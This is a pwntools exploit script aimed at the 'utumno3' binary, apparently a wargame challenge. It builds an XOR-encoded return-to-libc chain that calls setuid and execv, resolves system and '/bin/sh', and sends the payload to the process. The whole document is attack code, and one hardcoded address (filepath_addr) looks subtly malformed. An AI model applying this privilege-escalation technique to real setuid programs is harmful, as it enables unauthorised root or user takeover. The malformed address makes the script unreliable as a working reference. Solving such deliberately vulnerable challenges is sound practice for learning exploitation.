#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./utumno3')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7c00000              # Set base address

puts = libc.sym['puts']
exit_addr = libc.sym['exit']
setuid = libc.sym['setuid']
system = libc.sym['system']
execv = libc.sym['execv']
binsh = next(libc.search(b'/bin/sh'))  # grab string location

array_addr = 0xffffcf50 

filepath_addr = 0xfffcf6c
command_addr = 0xffffcf5c

filepath = b'./exploit.py\x00'
command = b'/usr/bin/cat\x00\x00\x00\x00'

addresses = b''
addresses += p32(setuid)
addresses += p32(execv)
addresses += p32(1000)
# addresses += p32(exit_addr)
# addresses += p32(binsh)
addresses += p32(command_addr)
addresses += p32(array_addr)
addresses += p32(command_addr)
addresses += p32(filepath_addr)
addresses += p32(0x0)
addresses += command
addresses += filepath

log.info("System is: " + system.to_bytes(4, 'big').hex())
log.info("Binsh is: " + binsh.to_bytes(4, 'big').hex())

a = 0
ka = 36
payload = b''
for i in range(len(addresses)):
    payload += (ka ^ (3 * a)).to_bytes(1, 'big')
    payload += addresses[i].to_bytes(1, 'big')
    ka += 1
    a += 1
    
    if a == 20:
        payload += (28 ^ (3 * a)).to_bytes(1, 'big') + b'\x00'
        a = 1

payload += b'\xff' * 40

with open("./payload.b", "wb") as file:
    file.write(payload)

p.clean()
pause()
p.sendline(payload.decode('latin-1'))
# p.interactive()
log.info(p.clean())
